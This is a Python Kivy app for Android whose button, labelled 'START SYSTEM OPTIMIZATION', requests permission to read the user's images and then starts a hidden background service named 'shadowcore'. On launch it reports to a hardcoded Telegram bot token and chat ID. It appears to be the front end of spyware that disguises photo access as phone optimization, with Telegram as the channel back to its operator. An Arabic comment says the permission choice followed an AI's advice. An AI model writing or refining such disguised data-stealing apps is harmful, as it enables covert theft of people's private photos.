from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
from android.permissions import request_permissions, Permission
import requests

# بياناتك
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

class ShadowApp(App):
    def build(self):
        layout = BoxLayout(orientation="vertical", padding=40, spacing=20)
        self.status = Label(text="System Standby", font_size='18sp')
        
        btn = Button(
            text="START SYSTEM OPTIMIZATION",
            background_color=(0, 0.6, 0, 1),
            font_size='20sp',
            bold=True
        )
        btn.bind(on_press=self.ask_perms)
        
        layout.add_widget(self.status)
        layout.add_widget(btn)
        return layout

    def on_start(self):
        # رسالة تفعيل عند فتح التطبيق
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": "✅ تم تفعيل واجهة التطبيق بنجاح"}
            )
        except: pass

    def ask_perms(self, instance):
        # طلب إذن الصور فقط كما نصح الـ AI
        perms = [Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
        request_permissions(perms, self.start_service)

    def start_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Service = autoclass('org.test.shadowcore.ServiceMyservice')
            Service.start(PythonActivity.mActivity, "")
            self.status.text = "Service Running..."
        except Exception as e:
            self.status.text = str(e)

if __name__ == "__main__":
    ShadowApp().run()
